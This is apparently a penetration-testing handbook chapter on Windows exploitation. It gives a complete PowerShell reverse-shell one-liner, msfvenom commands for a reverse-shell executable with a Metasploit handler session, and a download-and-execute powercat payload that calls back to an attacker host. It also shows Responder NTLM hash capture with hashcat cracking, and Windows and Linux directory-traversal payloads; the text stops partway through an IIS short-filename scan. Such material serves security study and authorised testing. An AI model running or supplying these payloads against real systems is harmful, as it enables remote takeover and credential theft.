# Exploitation

## Shells

### Powershell encoded Reverse

A reverse shell sends a connection back to an attacker, from which they can execute commands on the target interactively. In PowerShell, this can be done by creating a TCP socket, receiving a command, and then sending back the output.&#x20;

A short implementation of this is [revshells.com - PowerShell #3 (Base64)](https://www.revshells.com/). It uses the following payload and replaces the `$IP` and `$PORT` with your server:

{% code title="Payload" overflow="wrap" %}
```powershell
$client = New-Object System.Net.Sockets.TCPClient("$IP",$PORT);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
```
{% endcode %}

### MSFVenom (`.exe`)

[The Metasploit Framework](https://www.metasploit.com/) has a collection of tools that work together, one of which is `msfvenom`. This command generates payloads in various formats that do certain things, often resulting in a shell for the attacker. You can list them all, but here are some of the most useful ones:

<pre class="language-shell-session"><code class="lang-shell-session"><strong>$ msfvenom -l payloads
</strong>...
windows/shell_reverse_tcp           Connect back to attacker and spawn a command shell
windows/shell/reverse_tcp           Spawn a piped command shell (staged). Connect back 
                                    to the attacker
windows/meterpreter_reverse_https   Connect back to attacker and spawn a Meterpreter
                                    shell. Requires Windows XP SP2 or newer.
</code></pre>

* `windows/shell_reverse_tcp` -> This is one of the only shells that doesn't require MSF, all it does is spawn an interactive CMD shell and connect back to your port, which may be a simple netcat listener using `nc -lnvp 1337`.
* `windows/shell/reverse_tcp` -> The staged variant of the above, which requires MSF to send a second stage actually containing the shell functionality.&#x20;
* `windows/meterpreter_reverse_https` -> A fancier shell that sends a 'meterpreter' payload, which only MSF can handle. This has some more features and the `_https` variant even encrypts all traffic going back and forth making it hard to analyze.&#x20;

Generate payloads using the `msfvenom` command, and `-p` to choose them by name. After this, you can fill in variables like `LHOST` and `LPORT` to tell the payload where your listener will be, and finally use `-f` to choose a format and `-o` where to place it.

{% code title="Generate .exe payload" overflow="wrap" %}
```bash
msfvenom -p windows/shell_reverse_tcp LHOST=10.10.10.10 LPORT=1337 -f exe -o payload.exe
```
{% endcode %}

For the last two, you require setting up a matching handler in `msfconsole`:

<pre class="language-shell-session" data-title="Set up a handler"><code class="lang-shell-session">$ msfconsole
<strong>msf6 > use multi/handler
</strong>[*] Using configured payload generic/shell_reverse_tcp
<strong>msf6 exploit(multi/handler) > show options
</strong>
Payload options (windows/shell_reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  process          yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST                      yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port

<strong>msf6 exploit(multi/handler) > set LHOST 10.10.10.10
</strong><strong>msf6 exploit(multi/handler) > set LPORT 1337
</strong><strong>msf6 exploit(multi/handler) > run
</strong>
[-] Handler failed to bind to 10.10.10.10:1337:-  -
[*] Started reverse TCP handler on 0.0.0.0:1337
[*] Command shell session 1 opened (10.10.10.10:1337 -> 10.10.10.10:2515)

### Download + IEX PowerCat

If your payload needs to be small, a solution is just to download the whole payload later, and evaluate it. These are known as "staged payloads" and one way to do this is by using [powercat](https://github.com/besimorhino/powercat). This is a PowerShell script that can let you easily create a reverse shell. Simply download [powercat.ps1](https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1) and host it yourself if the target does not have an internet connection. Then all that's left is to download and evaluate the script to connect with a simple command:

{% code title="Attacker's Machine" %}
```shell-session
$ python3 -m http.server  # Set up the HTTP server with powercat.ps1 inside
$ nc -lnvp 1337           # Set up the reverse shell listener
```
{% endcode %}

{% code title="Payload" %}
```powershell
IEX(New-Object System.Net.WebClient).DownloadString('http://10.10.10.10:8000/powercat.ps1');
powercat -c 10.10.10.10 -p 1337 -e powershell
```
{% endcode %}

After this payload fires, you should get a request on your HTTP server from the target downloading your file, and a little later a reverse shell on your 2nd listener as well.

## Forcing Authentication to Relay

When a client authenticates with a service using [ntlm.md](windows-authentication/ntlm.md "mention"), a challenge-response mechanism is used to verify if the user knows their password without sending it over the network. If a victim authenticates with a malicious server set up by the attacker, the response to a challenge the attacker gives is based on the user's password and no other unknown factors. That means we can also then **brute-force** the associated password offline.&#x20;

We can force such an authentication by, for example, making them request a share like `\\10.10.10.10\share`, or a _file_ on a share with `\\10.10.10.10\share\file`. This will then make an authentication to your IP address, which you can abuse.

{% hint style="info" %}
Requesting an IP address will force NTLM authentication, using a hostname chooses Kerberos instead!
{% endhint %}

Using a tool like [Responder](https://github.com/lgandx/Responder) you can send them a challenge, which they will solve and give you back the answer allowing the password to be brute-forced:

<pre class="language-shell-session" data-overflow="wrap"><code class="lang-shell-session"><strong>$ responder -I tun0
</strong>...
[SMB] NTLMv2-SSP Client   : ::ffff:$IP
[SMB] NTLMv2-SSP Username : domain\user
<strong>[SMB] NTLMv2-SSP Hash     : user::domain:317fa5f2dd004ccf:E1714375CE4544DB806CE4AAE633CDBC:01010000000000000077F24ADD6FD9018B224A572597F60C00000000020008005A0053004800410001001E00570049004E002D00330055004B00370039004F003800350050004900440004003400570049004E002D00330055004B00370039004F00380035005000490044002E005A005300480041002E004C004F00430041004C00030014005A005300480041002E004C004F00430041004C00050014005A005300480041002E004C004F00430041004C00070008000077F24ADD6FD90106000400020000000800300030000000000000000000000000300000A1E4633A7918BDC606AA508FF308E1B782122CA729192CE34AEB53FF187F90EE0A001000000000000000000000000000000000000900220063006900660073002F00310030002E00310030002E00310034002E003100310037000000000000000000
</strong></code></pre>

The long **Hash** value can then be put into a file to be cracked with tools like [#hashcat](../cryptography/hashing/cracking-hashes.md#hashcat "mention"):

```bash
hashcat -m 5600 responder.hash /list/rockyou.txt
```

See [#pass-the-challenge-ntlm-relay](lateral-movement.md#pass-the-challenge-ntlm-relay "mention") for a more advanced technique where we relay the challenge to a different service to access it as the victim.&#x20;

## Web tricks

Due to some Windows quirks, the actions that websites perform behind the scenes might behave differently than on Linux. This chapter collects a few of these tricks that can often be abused because developers forget about them.

### Slashes (`/` vs `\`)

Directory Traversal vulnerabilities are quite common, where you use the special `..` sequence in a path to go up one directory, and then access a file/folder that's outside the regular allowed area. On Linux this is often done like so:

{% code title="Linux directory traversal" %}
```
/var/www/html/uploads/ + ../../../../etc/passwd = /etc/passwd
```
{% endcode %}

Because of this most path accesses block or replace `/` characters from the string. On Windows systems, this is not enough, however, as the main directory separator is a backslash (`\`) instead.&#x20;

{% code title="Windows with backslash" %}
```
C:\inetpub\wwwroot\uploads\ + ..\..\..\Windows\win.ini = C:\Windows\win.ini
```
{% endcode %}

Pretty often the Windows APIs even allow interchangeable use of them, resulting in payloads containing mixed forward and backward shashes.&#x20;

A good fuzzing list containing many of these techniques can be found here:

[https://github.com/1N3/IntruderPayloads/blob/master/FuzzLists/traversal.txt](https://github.com/1N3/IntruderPayloads/blob/master/FuzzLists/traversal.txt)

### ISS Short filenames (SFNs, 8.3 filenames)

Back in the DOS versions of Windows, filenames could only first 8 characters as their name and 3 characters as their extension. No more. Because of Windows's backward compatibility standards, all files actually still follow this rule. But nowadays longer filenames are allowed with just an alias stored as an 8.3 short filename (SFN) if it doesn't fit, for example:

<figure><img src="../.gitbook/assets/image.png" alt="" width="312"><figcaption><p>Some filenames that don't fit the 8.3 format and have gotten aliases in <mark style="color:red;">red</mark>, while fitting ones are in <mark style="color:blue;">blue</mark></p></figcaption></figure>

An Internet Information Services (IIS) webserver running on the machine might actually interpret these SFNs and give you back the content of the larger file. This can be incredibly useful for directory/filename brute-forcing because any giant path can be found this way by just guessing its short name. Read the following article to understand how we can efficiently guess these names:

{% embed url="https://soroush.me/blog/2023/07/thirteen-years-on-advancing-the-understanding-of-iis-short-file-name-sfn-disclosure/" %}

Tools such as [shortscan](https://github.com/bitquark/shortscan) implement clever techniques to find all possible short filenames and print if the service is vulnerable:

<pre class="language-shell-session"><code class="lang-shell-session"><strong>$ shortscan http://example.org/
</strong>Shortscan v0.6 · an IIS short filename enumeration tool by bitquark

<strong>Vulnerable: No (or no 8.3 files exist)
